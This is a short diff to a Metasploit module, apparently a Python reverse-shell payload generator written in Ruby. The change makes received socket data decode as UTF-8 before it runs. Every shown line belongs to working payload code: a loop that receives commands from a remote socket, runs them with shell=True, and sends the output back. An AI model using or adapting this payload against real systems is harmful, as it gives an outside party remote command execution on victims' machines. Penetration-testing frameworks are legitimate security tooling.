@@ -61,7 +61,7 @@ module MetasploitModule
     cmd += "while not #{dead}:\n"
     cmd += "\tdata=s.recv(1024)\n"
     cmd += "\tif len(data)==0:\n\t\t#{dead} = True\n"
-    cmd += "\tproc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)\n"
+    cmd += "\tproc=subprocess.Popen(data.decode('utf-8'),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)\n"
     cmd += "\tstdout_value=proc.stdout.read() + proc.stderr.read()\n"
     cmd += "\ts.send(stdout_value)\n"
     "#{datastore['PythonPath']} -c \"#{ py_create_exec_stub(cmd) }\""
